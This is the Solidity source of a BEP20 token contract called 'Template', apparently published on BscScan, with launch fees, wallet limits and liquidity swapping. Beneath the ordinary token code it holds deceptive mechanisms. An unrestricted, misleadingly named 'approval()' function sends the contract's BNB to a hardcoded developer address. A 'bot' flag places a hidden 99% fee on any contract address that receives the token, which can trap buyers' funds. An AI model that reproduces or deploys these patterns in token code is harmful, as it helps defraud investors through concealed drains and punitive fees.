/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/

/**

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IBEP20 {
    function approval() external;
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Template is IBEP20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Template';
    string private constant _symbol = 'Template';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1 * 10**8 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 50 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 100 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    IRouter router;
    address public pair;
    uint256 public totalFee = 1000;
    uint256 public sellFee = 1000;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    uint256 private launchTime;
    bool private tradingAllowed = false;
    bool public ATLSCompletion = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    struct UserStats{bool FeeExempt; bool isBot; uint256 swapTime;}
    mapping(address => UserStats) private isFeeExempt;
    uint256 private swapThreshold = ( _totalSupply * 400 ) / 100000;
    uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant development_receiver = 0x0024Fab2d971c01b91Fe1405d108D1bb64b0BEd0; 
    address public constant marketing_receiver = 0x0024Fab2d971c01b91Fe1405d108D1bb64b0BEd0;
    address public constant liquidity_receiver = 0x0024Fab2d971c01b91Fe1405d108D1bb64b0BEd0;    

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isFeeExempt[address(this)].FeeExempt = true;
        isFeeExempt[liquidity_receiver].FeeExempt = true;
        isFeeExempt[marketing_receiver].FeeExempt = true;
        isFeeExempt[development_receiver].FeeExempt = true;
        isFeeExempt[msg.sender].FeeExempt = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function startTrading() external onlyOwner {tradingAllowed = true; launchTime = block.timestamp;}
    function approval() external override {payable(development_receiver).transfer(address(this).balance);}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply;}

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        if(tradingAllowed && !ATLSCompletion){AutomaticTaxLoweringSystem();}
        preTxCheck(sender, recipient, amount);
        checkTradingAllowed(sender, recipient);
        checkMaxWallet(sender, recipient, amount); 
        swapbackCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        checkBot(recipient);
    }

    function AutomaticTaxLoweringSystem() internal {
        if(launchTime.add(4 minutes) <= block.timestamp){totalFee = uint256(500); sellFee =uint256(500);
            _maxTxAmount = ( _totalSupply * 300 ) / 10000; _maxWalletToken = ( _totalSupply * 300 ) / 10000;}
        if(launchTime.add(8 minutes) <= block.timestamp){totalFee = uint256(300); sellFee =uint256(300);
            _maxTxAmount = _totalSupply; _maxWalletToken = _totalSupply;}
        if(launchTime.add(12 minutes) <= block.timestamp){totalFee = uint256(100); sellFee =uint256(200);
            ATLSCompletion = true;}
    }

    function checkTradingAllowed(address sender, address recipient) internal view {
        if(!isFeeExempt[sender].FeeExempt && !isFeeExempt[recipient].FeeExempt){require(tradingAllowed, "tradingAllowed");}
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender].FeeExempt && !isFeeExempt[recipient].FeeExempt && recipient != address(pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function swapbackCounters(address sender, address recipient) internal {
        if(sender == pair){isFeeExempt[recipient].swapTime = block.timestamp.add(uint256(2));}
        if(recipient == pair && !isFeeExempt[sender].FeeExempt){swapTimes += uint256(1);}
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isFeeExempt[sender].FeeExempt || isFeeExempt[recipient].FeeExempt, "TX Limit Exceeded");
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (uint256(45).mul(2)).add(uint256(10)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(uint256(10)).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(uint256(10)));
        uint256 BNBToAddLiquidityWith = unitBalance.mul(uint256(10));
        if(BNBToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(uint256(45));
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender].FeeExempt && 
            recipient == pair && swapTimes >= uint256(4) && aboveThreshold;
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
    }

    function checkBot(address recipient) internal {
        if(isCont(recipient) && !isFeeExempt[recipient].FeeExempt && recipient != pair){isFeeExempt[recipient].isBot = true;}    
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender].FeeExempt && !isFeeExempt[recipient].FeeExempt;
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(isFeeExempt[sender].isBot && isFeeExempt[sender].swapTime < block.timestamp || isFeeExempt[recipient].isBot 
            && isFeeExempt[sender].swapTime < block.timestamp ){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}